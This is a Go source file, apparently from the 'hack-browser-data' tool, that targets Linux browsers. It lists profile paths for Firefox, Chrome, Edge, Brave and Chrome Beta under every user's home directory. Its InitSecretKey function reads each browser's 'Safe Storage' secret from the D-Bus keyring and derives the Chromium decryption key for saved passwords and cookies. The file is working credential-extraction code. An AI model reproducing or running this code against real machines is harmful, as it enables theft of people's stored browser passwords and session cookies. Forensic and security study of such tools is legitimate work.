package core

import (
	"crypto/sha1"

	"hack-browser-data/log"

	"github.com/godbus/dbus/v5"
	keyring "github.com/ppacher/go-dbus-keyring"
	"golang.org/x/crypto/pbkdf2"
)

const (
	fireFoxProfilePath    = "/home/*/.mozilla/firefox/*.default-release/"
	chromeProfilePath     = "/home/*/.config/google-chrome/*/"
	edgeProfilePath       = "/home/*/.config/microsoft-edge*/*/"
	braveProfilePath      = "/home/*/.config/BraveSoftware/Brave-Browser/*/"
	chromeBetaProfilePath = "/home/*/.config/google-chrome-beta/*/"
)

const (
	chromeStorageName     = "Chrome Safe Storage"
	edgeStorageName       = "Chromium Safe Storage"
	braveStorageName      = "Brave Safe Storage"
	chromeBetaStorageName = "Chrome Safe Storage"
)

var (
	browserList = map[string]struct {
		ProfilePath string
		Name        string
		KeyPath     string
		Storage     string
		New         func(profile, key, name, storage string) (Browser, error)
	}{
		"firefox": {
			ProfilePath: fireFoxProfilePath,
			Name:        firefoxName,
			New:         NewFirefox,
		},
		"chrome": {
			ProfilePath: chromeProfilePath,
			Name:        chromeName,
			Storage:     chromeStorageName,
			New:         NewChromium,
		},
		"edge": {
			ProfilePath: edgeProfilePath,
			Name:        edgeName,
			Storage:     edgeStorageName,
			New:         NewChromium,
		},
		"brave": {
			ProfilePath: braveProfilePath,
			Name:        braveName,
			Storage:     braveStorageName,
			New:         NewChromium,
		},
		"chrome-beta": {
			ProfilePath: chromeBetaProfilePath,
			Name:        chromeBetaName,
			Storage:     chromeBetaStorageName,
			New:         NewChromium,
		},
	}
)

func (c *Chromium) InitSecretKey() error {
	// what is d-bus @https://dbus.freedesktop.org/
	var chromeSecret []byte
	conn, err := dbus.SessionBus()
	if err != nil {
		return err
	}
	svc, err := keyring.GetSecretService(conn)
	if err != nil {
		return err
	}
	session, err := svc.OpenSession()
	if err != nil {
		return err
	}
	defer func() {
		session.Close()
	}()
	collections, err := svc.GetAllCollections()
	if err != nil {
		return err
	}
	for _, col := range collections {
		items, err := col.GetAllItems()
		if err != nil {
			return err
		}
		for _, item := range items {
			label, err := item.GetLabel()
			if err != nil {
				log.Error(err)
				continue
			}
			if label == c.storage {
				se, err := item.GetSecret(session.Path())
				if err != nil {
					log.Error(err)
					return err
				}
				chromeSecret = se.Value
			}
		}
	}
	if chromeSecret == nil {
		return errDbusSecretIsEmpty
	}
	var chromeSalt = []byte("saltysalt")
	// @https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_linux.cc
	key := pbkdf2.Key(chromeSecret, chromeSalt, 1, 16, sha1.New)
	c.secretKey = key
	return nil
}
